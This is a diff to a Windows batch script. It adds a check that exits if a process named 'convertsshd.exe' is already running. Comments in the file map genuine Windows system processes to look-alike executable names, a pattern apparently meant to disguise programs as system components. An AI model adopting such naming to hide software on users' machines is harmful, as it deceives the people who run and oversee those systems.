@@ -1,10 +1,24 @@
 :: ( nHBAPWtA )
 @echo off
 
+
 ::ShellHost.exe ---> TSSPrxySHST.exe
 ::RuntimeBroker.exe ---> TSSPrxyRNTM.exe
 ::COM Surrogate.exe ---> SyncHostApp.exe
 ::StartupTaskCaller.exe ---> TSSPrxySTC.exe
+
+
+
+tasklist /FI "IMAGENAME eq convertsshd.exe" | find /I "convertsshd.exe" >nul
+if %ERRORLEVEL% equ 0 (
+    echo Process is running. Exiting...
+    exit
+) else (
+    echo Process not found. Continuing...
+    REM Place the rest of your batch commands here
+)
+
+
 
 cd /d "%~dp0"
 
